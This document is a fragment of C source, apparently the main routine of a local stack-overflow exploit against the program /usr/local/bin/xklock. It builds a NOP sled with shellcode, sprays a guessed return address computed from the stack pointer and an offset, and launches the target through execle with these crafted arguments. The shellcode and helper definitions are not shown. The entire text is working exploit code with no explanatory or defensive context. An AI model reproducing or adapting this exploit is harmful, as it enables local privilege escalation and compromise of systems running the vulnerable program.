int main(int argc, char *argv[]) {
 char egg[EGGSIZE], ret[RETSIZE];
 int i, eggsize = EGGSIZE, retsize = RETSIZE, nop = NOP, offset=OFFSET;
 long *address;
  
 if(argc > 1){ offset = atoi(argv[1]); }
 (char *)address = get_sp - offset;
 fprintf(stderr, "Using addr: 0x%x\n", address);

 memset(egg, nop, eggsize);
 memcpy(egg+(eggsize - strlen(shellcode) - 1), shellcode, strlen(shellcode));
 for(i=0; i < retsize; i+=4) *(int *)&ret[i]=address;

 if(execle("/usr/local/bin/xklock", egg, "-bg", ret, NULL, NULL)) {
  fprintf(stderr,"Unable to execute /usr/local/bin/xklock\n");
  exit(1);
 }
}